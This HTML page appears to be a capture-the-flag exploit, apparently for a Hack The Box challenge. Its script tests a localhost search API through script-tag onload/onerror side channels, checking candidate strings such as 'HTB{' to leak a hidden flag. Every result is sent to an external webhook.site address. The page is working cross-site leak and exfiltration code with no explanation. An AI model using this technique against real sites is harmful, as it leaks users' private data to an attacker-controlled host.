<!DOCTYPE html>
<html><head><title>abuse</title></head><body>
<script>
const W='https://webhook.site/97b90c33-9617-4d41-a1a2-d054deac91e4';
const B='http://x.x@127.0.0.1:1337/api/entries/search?q=';

function probe(q){
  return new Promise(resolve=>{
    const s=document.createElement('script');
    s.src=B+encodeURIComponent(q);
    s.onload=()=>{ fetch(W+'?q='+encodeURIComponent(q)+'&r=load'); s.remove(); resolve(true); };
    s.onerror=()=>{ fetch(W+'?q='+encodeURIComponent(q)+'&r=err'); s.remove(); resolve(false); };
    document.head.appendChild(s);
    setTimeout(()=>resolve(null),5000);
  });
}

(async()=>{
  fetch(W+'?start=1');
  // 測試幾個 known matches and known non-matches
  const r1 = await probe('Drunk');  // match approved
  fetch(W+'?Drunk=' + r1);
  const r2 = await probe('XXX_NOMATCH');  // no match
  fetch(W+'?nomatch=' + r2);
  const r3 = await probe('HTB');  // potential match unapproved
  fetch(W+'?HTB=' + r3);
  const r4 = await probe('HTB{');  // potential match unapproved
  fetch(W+'?HTB_brace=' + r4);
})();
</script>
</body></html>
